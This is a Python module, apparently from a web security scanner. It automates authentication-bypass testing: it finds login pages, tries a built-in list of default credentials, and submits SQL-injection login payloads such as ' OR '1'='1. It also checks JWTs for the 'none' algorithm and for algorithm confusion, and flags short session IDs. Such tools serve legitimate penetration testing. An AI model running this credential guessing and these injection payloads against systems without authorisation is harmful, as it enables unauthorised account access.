"""
Authentication Bypass Exploitation Module.
Tests for default credentials, JWT vulnerabilities, and session attacks.
"""
import re
import json
import base64
import logging
import hashlib
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse
import requests
from dataclasses import dataclass
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)

# Default credential database (common admin panels)
DEFAULT_CREDENTIALS = [
    # Most common
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('admin', 'admin123'),
    ('admin', 'Admin@123'),
    ('root', 'root'),
    ('root', 'toor'),
    ('root', 'password'),
    ('administrator', 'administrator'),
    ('administrator', 'password'),
    ('user', 'user'),
    ('user', 'password'),
    ('test', 'test'),
    ('guest', 'guest'),
    
    # Application-specific
    ('admin', ''),
    ('sa', ''),  # SQL Server default
    ('postgres', 'postgres'),
    ('mysql', 'mysql'),
    ('tomcat', 'tomcat'),
    ('manager', 'manager'),
    ('weblogic', 'weblogic'),
    ('oracle', 'oracle'),
    ('cisco', 'cisco'),
    ('admin', 'adminpasswd'),
    
    # CMS defaults
    ('admin', 'Wordpress'),
    ('admin', 'joomla'),
    ('admin', 'drupal'),
    ('admin', 'magento'),
]

# Common login endpoints
LOGIN_ENDPOINTS = [
    '/login', '/admin/login', '/administrator', '/wp-admin',
    '/wp-login.php', '/user/login', '/auth/login', '/signin',
    '/admin', '/panel', '/controlpanel', '/accounts/login/',
    '/api/login', '/api/auth', '/api/v1/auth/login',
]

# Common form field names
USERNAME_FIELDS = ['username', 'user', 'email', 'login', 'name', 'user_login', 'log']
PASSWORD_FIELDS = ['password', 'pass', 'passwd', 'pwd', 'user_password', 'pwd']

@dataclass
class AuthBypassResult:
    url: str
    technique: str
    username: str
    password: str
    success: bool
    evidence: str
    token: str = ''
    session_id: str = ''

class AuthBypassExploiter:
    """
    Advanced authentication bypass engine.
    Tests default creds, JWT attacks, and session manipulation.
    """
    
    def __init__(self, timeout: int = 10, max_attempts: int = 50):
        self.timeout = timeout
        self.max_attempts = max_attempts
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.tested_count = 0
    
    def exploit(self, url: str) -> List[AuthBypassResult]:
        """
        Comprehensive authentication bypass testing.
        """
        results = []
        logger.info(f"Starting auth bypass scan on {url}")
        
        # Find login pages
        login_pages = self._find_login_pages(url)
        
        for login_url in login_pages[:3]:  # Limit to 3 login pages
            logger.info(f"Testing login: {login_url}")
            
            # 1. Default credential testing
            cred_results = self._test_default_credentials(login_url)
            results.extend(cred_results)
            
            # 2. SQL injection in login
            sqli_results = self._test_login_sqli(login_url)
            results.extend(sqli_results)
        
        # 3. JWT vulnerabilities (if tokens found)
        jwt_results = self._test_jwt_vulnerabilities(url)
        results.extend(jwt_results)
        
        # 4. Session fixation
        session_results = self._test_session_fixation(url)
        results.extend(session_results)
        
        logger.info(f"Auth bypass scan complete: {len(results)} vulns, {self.tested_count} tests")
        return results
    
    def _find_login_pages(self, base_url: str) -> List[str]:
        """Discover login pages on target."""
        found_pages = []
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        for endpoint in LOGIN_ENDPOINTS[:10]:
            test_url = urljoin(base, endpoint)
            try:
                response = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                if response.status_code == 200:
                    # Check if it looks like a login page
                    if self._looks_like_login(response.text):
                        found_pages.append(test_url)
                        logger.info(f"Found login page: {test_url}")
            except:
                pass
        
        if not found_pages:
            # Try the base URL itself
            try:
                response = self.session.get(base_url, timeout=self.timeout)
                if self._looks_like_login(response.text):
                    found_pages.append(base_url)
            except:
                pass
        
        return found_pages
    
    def _looks_like_login(self, html: str) -> bool:
        """Check if HTML contains login form."""
        indicators = ['password', 'login', 'sign in', 'username', 'email', 'authenticate']
        html_lower = html.lower()
        matches = sum(1 for ind in indicators if ind in html_lower)
        return matches >= 2
    
    def _test_default_credentials(self, login_url: str) -> List[AuthBypassResult]:
        """Test default credentials."""
        results = []
        
        # Get login form details
        form_data = self._extract_login_form(login_url)
        if not form_data:
            return results
        
        action_url = form_data.get('action', login_url)
        username_field = form_data.get('username_field', 'username')
        password_field = form_data.get('password_field', 'password')
        extra_fields = form_data.get('extra_fields', {})
        
        attempts = 0
        for username, password in DEFAULT_CREDENTIALS[:self.max_attempts]:
            if attempts >= self.max_attempts:
                break
            
            post_data = extra_fields.copy()
            post_data[username_field] = username
            post_data[password_field] = password
            
            try:
                response = self.session.post(
                    action_url,
                    data=post_data,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                self.tested_count += 1
                attempts += 1
                
                # Check for successful login
                if self._is_login_successful(response, login_url):
                    logger.warning(f"Default creds work: {username}:{password}")
                    results.append(AuthBypassResult(
                        url=login_url,
                        technique='default_credentials',
                        username=username,
                        password=password,
                        success=True,
                        evidence=f"Login successful with {username}:{password}",
                    ))
                    # Found one, that's enough
                    return results
            
            except Exception as e:
                logger.debug(f"Credential test error: {e}")
        
        return results
    
    def _test_login_sqli(self, login_url: str) -> List[AuthBypassResult]:
        """Test SQL injection bypass in login forms."""
        sqli_payloads = [
            ("' OR '1'='1", "' OR '1'='1"),
            ("admin'--", "anything"),
            ("admin' #", "anything"),
            ("' OR 1=1--", "' OR 1=1--"),
            ("admin' OR '1'='1'--", "x"),
            ("' OR ''='", "' OR ''='"),
            ("admin'/*", "*/='"),
        ]
        
        results = []
        form_data = self._extract_login_form(login_url)
        if not form_data:
            return results
        
        action_url = form_data.get('action', login_url)
        username_field = form_data.get('username_field', 'username')
        password_field = form_data.get('password_field', 'password')
        extra_fields = form_data.get('extra_fields', {})
        
        for sqli_user, sqli_pass in sqli_payloads:
            post_data = extra_fields.copy()
            post_data[username_field] = sqli_user
            post_data[password_field] = sqli_pass
            
            try:
                response = self.session.post(
                    action_url,
                    data=post_data,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                self.tested_count += 1
                
                if self._is_login_successful(response, login_url):
                    logger.warning(f"SQLi auth bypass works: {sqli_user}")
                    results.append(AuthBypassResult(
                        url=login_url,
                        technique='sqli_auth_bypass',
                        username=sqli_user,
                        password=sqli_pass,
                        success=True,
                        evidence=f"SQL injection bypassed authentication",
                    ))
                    return results
            
            except Exception as e:
                logger.debug(f"SQLi login test error: {e}")
        
        return results
    
    def _test_jwt_vulnerabilities(self, url: str) -> List[AuthBypassResult]:
        """Test for JWT vulnerabilities."""
        results = []
        
        # Try to find JWTs in the application
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Check for JWT in cookies
            for cookie in self.session.cookies:
                if self._is_jwt(cookie.value):
                    jwt_result = self._test_jwt_attacks(cookie.value, url, f"cookie:{cookie.name}")
                    if jwt_result:
                        results.append(jwt_result)
            
            # Check for JWT in response
            jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
            jwt_matches = re.findall(jwt_pattern, response.text)
            for jwt_token in jwt_matches[:3]:
                jwt_result = self._test_jwt_attacks(jwt_token, url, "response_body")
                if jwt_result:
                    results.append(jwt_result)
        
        except Exception as e:
            logger.debug(f"JWT test error: {e}")
        
        return results
    
    def _is_jwt(self, token: str) -> bool:
        """Check if string is a JWT."""
        parts = token.split('.')
        if len(parts) != 3:
            return False
        try:
            # Try to decode header
            header = base64.urlsafe_b64decode(parts[0] + '==')
            json.loads(header)
            return True
        except:
            return False
    
    def _test_jwt_attacks(self, token: str, url: str, location: str) -> Optional[AuthBypassResult]:
        """Test JWT for common vulnerabilities."""
        try:
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            # Check for weak algorithm
            alg = header.get('alg', '').upper()
            
            if alg == 'NONE' or alg == 'none':
                return AuthBypassResult(
                    url=url,
                    technique='jwt_alg_none',
                    username='',
                    password='',
                    success=True,
                    evidence=f"JWT uses 'none' algorithm - signature bypass possible",
                    token=token,
                )
            
            # Check for sensitive data in payload
            sensitive_keys = ['password', 'secret', 'key', 'admin', 'role']
            for key in payload:
                if any(s in key.lower() for s in sensitive_keys):
                    return AuthBypassResult(
                        url=url,
                        technique='jwt_sensitive_data',
                        username='',
                        password='',
                        success=True,
                        evidence=f"JWT contains sensitive data: {key}={payload[key]}",
                        token=token,
                    )
            
            # Try algorithm confusion (RS256 -> HS256)
            if alg in ['RS256', 'RS384', 'RS512']:
                return AuthBypassResult(
                    url=url,
                    technique='jwt_alg_confusion_possible',
                    username='',
                    password='',
                    success=True,
                    evidence=f"JWT uses {alg} - algorithm confusion attack may be possible",
                    token=token,
                )
        
        except Exception as e:
            logger.debug(f"JWT analysis error: {e}")
        
        return None
    
    def _test_session_fixation(self, url: str) -> List[AuthBypassResult]:
        """Test for session fixation vulnerability."""
        results = []
        
        try:
            # Get initial session
            self.session.cookies.clear()
            response1 = self.session.get(url, timeout=self.timeout)
            initial_cookies = dict(self.session.cookies)
            
            # Check if session ID persists through different requests
            # (simplified check - real test would require login flow)
            if any('session' in k.lower() or 'sess' in k.lower() for k in initial_cookies):
                for name, value in initial_cookies.items():
                    if 'session' in name.lower() or 'sess' in name.lower():
                        # Session cookie found - check properties
                        cookie = self.session.cookies.get(name)
                        if cookie:
                            # Weak session indicator
                            if len(value) < 20:
                                results.append(AuthBypassResult(
                                    url=url,
                                    technique='weak_session_id',
                                    username='',
                                    password='',
                                    success=True,
                                    evidence=f"Session ID is too short ({len(value)} chars)",
                                    session_id=value,
                                ))
        
        except Exception as e:
            logger.debug(f"Session fixation test error: {e}")
        
        return results
    
    def _extract_login_form(self, url: str) -> Optional[Dict[str, Any]]:
        """Extract login form details from page."""
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find form with password field
            for form in soup.find_all('form'):
                has_password = form.find('input', {'type': 'password'})
                if has_password:
                    result = {
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'POST').upper(),
                        'extra_fields': {},
                    }
                    
                    # Find username field
                    for field_name in USERNAME_FIELDS:
                        username_input = form.find('input', {'name': field_name})
                        if username_input:
                            result['username_field'] = field_name
                            break
                    else:
                        # Try to find any text input
                        text_input = form.find('input', {'type': 'text'})
                        if text_input and text_input.get('name'):
                            result['username_field'] = text_input['name']
                    
                    # Find password field
                    password_input = form.find('input', {'type': 'password'})
                    if password_input and password_input.get('name'):
                        result['password_field'] = password_input['name']
                    
                    # Collect hidden fields (CSRF tokens, etc.)
                    for hidden in form.find_all('input', {'type': 'hidden'}):
                        if hidden.get('name') and hidden.get('value'):
                            result['extra_fields'][hidden['name']] = hidden['value']
                    
                    return result
        
        except Exception as e:
            logger.debug(f"Form extraction error: {e}")
        
        return None
    
    def _is_login_successful(self, response: requests.Response, login_url: str) -> bool:
        """Determine if login was successful."""
        # Check if redirected away from login page
        if response.url != login_url and 'login' not in response.url.lower():
            return True
        
        # Check for success indicators in response
        success_indicators = ['welcome', 'dashboard', 'logout', 'profile', 'account', 'logged in']
        for indicator in success_indicators:
            if indicator in response.text.lower():
                return True
        
        # Check for failure indicators
        failure_indicators = ['invalid', 'incorrect', 'failed', 'error', 'wrong password']
        for indicator in failure_indicators:
            if indicator in response.text.lower():
                return False
        
        # Check cookies for session token
        if any('session' in c.lower() or 'auth' in c.lower() for c in response.cookies.keys()):
            return True
        
        return False


def run_auth_bypass_exploitation(url: str) -> List[Dict[str, Any]]:
    """Run authentication bypass exploitation."""
    exploiter = AuthBypassExploiter()
    results = exploiter.exploit(url)
    
    findings = []
    for result in results:
        if result.technique == 'default_credentials':
            severity = 'CRITICAL'
            description = f'Default credentials work: {result.username}:{result.password}'
        elif result.technique == 'sqli_auth_bypass':
            severity = 'CRITICAL'
            description = 'SQL injection bypasses authentication completely'
        elif 'jwt' in result.technique:
            severity = 'HIGH'
            description = f'JWT vulnerability: {result.technique}'
        else:
            severity = 'MEDIUM'
            description = result.evidence
        
        findings.append({
            'issue': f'Authentication Bypass ({result.technique.replace("_", " ").title()})',
            'severity': severity,
            'category': 'auth_bypass',
            'impact': 'Attacker can gain unauthorized access to protected resources without valid credentials.',
            'description': description,
            'recommendation': 'Use strong, unique passwords. Implement account lockout. Use parameterized queries. Secure JWT implementation.',
            'affected_element': result.url,
            'score_impact': 40 if severity == 'CRITICAL' else 25,
            'evidence': result.evidence[:500],
            'poc': f'''# Auth Bypass Proof of Concept
# URL: {result.url}
# Technique: {result.technique}
# Credentials: {result.username}:{result.password}
''',
            'confidence': 'HIGH',
        })
    
    return findings
